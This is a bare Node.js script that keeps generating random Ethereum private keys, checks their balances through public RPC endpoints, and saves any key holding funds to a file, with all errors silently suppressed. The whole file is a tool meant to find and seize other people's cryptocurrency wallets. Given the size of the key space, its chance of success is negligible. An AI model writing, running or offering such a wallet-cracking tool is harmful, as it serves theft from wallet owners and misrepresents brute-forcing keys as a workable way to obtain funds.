const Web3 = require('web3');
const crypto = require('crypto');
const fs = require('fs');
const colors = require('couleurs');

process.on('uncaughtException', function (err) {});

const providers = [
  'https://eth.llamarpc.com',
  'https://rpc.builder0x69.io',
  'https://ethereum.publicnode.com',
  'https://rpc.mevblocker.io',
  'https://ethereum.publicnode.com'
];

function getRandomProvider() {
  const randomIndex = Math.floor(Math.random() * providers.length);
  return providers[randomIndex];
}

function generateAndCheck() {
  for (let i = 0; i < 10; i++) {
    const privateKey = crypto.randomBytes(32).toString('hex');
    const providerUrl = getRandomProvider();
    const web3 = new Web3(providerUrl);
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);

    web3.eth.getBalance(account.address).then((balance) => {
      if (balance > 0) {
        const output = `[+1] ${web3.utils.fromWei(balance, 'ether')}:${privateKey}:${account.address}`;
        console.log(colors(output, [0, 149, 190]));
        fs.appendFile('valid.txt', `${output}\n`, (err) => {
          if (err) throw err;
        });
      } else {
        const output = `[-1] ${web3.utils.fromWei(balance, 'ether')}:${privateKey}:${account.address}`;
        console.log(colors(output, [0, 149, 190]));
      }
    });
  }
}

setInterval(generateAndCheck, 50);
